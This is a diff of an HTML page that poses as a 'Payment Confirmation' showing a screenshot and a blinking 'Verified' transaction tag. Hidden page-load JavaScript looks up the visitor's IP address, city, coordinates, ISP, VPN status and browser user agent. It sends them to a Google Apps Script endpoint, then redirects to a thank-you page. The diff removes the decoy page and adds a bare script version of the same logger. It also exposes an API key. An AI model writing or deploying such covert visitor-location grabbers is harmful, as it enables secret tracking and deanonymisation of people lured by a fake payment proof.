@@ -1,71 +1,38 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Payment Confirmation</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial;
-      background: #f0f0f0;
-      text-align: center;
-    }
-    img {
-      width: 100%;
-      max-width: 500px;
-      margin-top: 40px;
-      border: 2px solid #ccc;
-    }
-    #tag {
-      font-weight: bold;
-      color: green;
-      margin-top: 10px;
-      animation: blink 1s infinite;
-    }
-    @keyframes blink {
-      0% { opacity: 1; }
-      50% { opacity: 0; }
-      100% { opacity: 1; }
-    }
-  </style>
-</head>
-<body>
-  <img src="screenshot.jpg" alt="Payment Screenshot" />
-  <div id="tag">Transaction ID: Verified ✔</div>
+<script>
+  window.onload = async () => {
+    try {
+      // 1. Fetch IP and location from ipify.org
+      const res = await fetch("https://geo.ipify.org/api/v2/country,city,vpn?apiKey=at_ZoGtnuZ3ne0op7PZ4BJUXaO0LHiVQ");
+      const geo = await res.json();
 
-  <script>
-    async function logData() {
-      try {
-        const ipRes = await fetch("https://geo.ipify.org/api/v2/country,city?apiKey=at_ZoGtnuZ3ne0op7PZ4BJUXaO0LHiVQ");
-        const ipData = await ipRes.json();
+      // 2. Detect device info
+      const device = navigator.userAgent;
 
-        const device = navigator.userAgent;
-        const data = {
-          ip: ipData.ip,
-          city: ipData.location.city,
-          region: ipData.location.region,
-          country: ipData.location.country,
-          isp: ipData.isp,
-          latitude: ipData.location.lat,
-          longitude: ipData.location.lng,
+      // 3. Send data to Google Apps Script Web App
+      await fetch("https://script.google.com/macros/s/AKfycbzDuvsgUSbdDG_pWV77T4zisfhtaL-zfAlYv_wcbOggEkLYl0wEMFnzj7oMlta1EjSr0A/exec", {
+        method: "POST",
+        body: JSON.stringify({
+          ip: geo.ip,
+          latitude: geo.location.lat,
+          longitude: geo.location.lng,
+          city: geo.location.city,
+          region: geo.location.region,
+          country: geo.location.country,
+          isp: geo.isp,
+          vpn: geo.security?.vpn ? "Yes" : "No",
           device: device
-        };
+        }),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      });
 
-        await fetch("https://script.google.com/macros/s/AKfycbzDuvsgUSbdDG_pWV77T4zisfhtaL-zfAlYv_wcbOggEkLYl0wEMFnzj7oMlta1EjSr0A/exec", {
-          method: "POST",
-          body: JSON.stringify(data),
-          headers: { "Content-Type": "application/json" }
-        });
-
-        setTimeout(() => {
-          window.location.href = "thankyou.html";
-        }, 5000);
-
-      } catch (err) {
-        console.error("Log failed", err);
-      }
+      // 4. Optional redirect
+      setTimeout(() => {
+        window.location.href = "thankyou.html"; // or whatever page
+      }, 5000);
+    } catch (error) {
+      console.error("❌ Error fetching or sending data", error);
     }
-
-    logData();
-  </script>
-</body>
-</html>
+  };
+</script>
